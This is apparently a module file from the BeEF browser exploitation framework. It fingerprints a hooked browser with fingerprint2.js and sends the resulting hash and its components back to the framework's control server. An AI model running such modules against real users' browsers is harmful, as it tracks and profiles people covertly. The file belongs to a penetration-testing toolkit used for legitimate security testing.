//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  <%=
    begin
      f = "#{$root_dir}/modules/browser/fingerprint_browser/fingerprint2.js"
      File.read(f)
    rescue => e
      print_error "[Fingerprint Browser] Could not read file '#{f}': #{e.message}"
    end
  %>

  try {
    setTimeout(function () {
      Fingerprint2.get(function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
        beef.debug('[Fingerprint Browser] Fingerprint: ' + murmur);
        beef.debug('[Fingerprint Browser] Components: ' + JSON.stringify(components));
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + murmur + '&components=' + JSON.stringify(components), beef.are.status_success());
      })
    }, 500)
  } catch(e) {
    beef.debug('[Fingerprint Browser] Error: ' + e.message);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + e.message, beef.are.status_error());
  }
});

